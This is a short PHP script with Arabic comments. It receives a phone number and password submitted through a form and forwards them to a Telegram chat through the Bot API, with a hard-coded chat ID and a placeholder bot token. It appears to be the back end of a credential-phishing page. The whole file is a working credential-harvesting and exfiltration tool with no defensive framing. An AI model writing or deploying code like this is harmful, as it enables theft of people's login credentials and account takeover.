<?php
// تأكد من استقبال البيانات بشكل صحيح
if(isset($_POST['phonenumber']) && isset($_POST['password'])) {
    $phonenumber = $_POST['phonenumber'];
    $password = $_POST['password'];

    // إعداد الرسالة
    $message = "رقم الهاتف: `$phonenumber`\nكلمة السر: `$password`\n";
    $bot_token = 'توكن البوت هنا'; // ضع توكن البوت الخاص بك هنا
    $chat_id = '8185195385'; // ضع رقم الشات هنا

    $url = "https://api.telegram.org/bot$bot_token/sendMessage";

    $data = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'markdown'
    ];

    // إرسال الطلب إلى Telegram
    $response = file_get_contents($url . '?' . http_build_query($data));
    if($response) {
        http_response_code(200);
        echo "تم الإرسال بنجاح!";
    } else {
        http_response_code(500);
        echo "حدث خطأ أثناء الإرسال!";
    }
} else {
    http_response_code(400);
    echo "بيانات ناقصة!";
}
?>
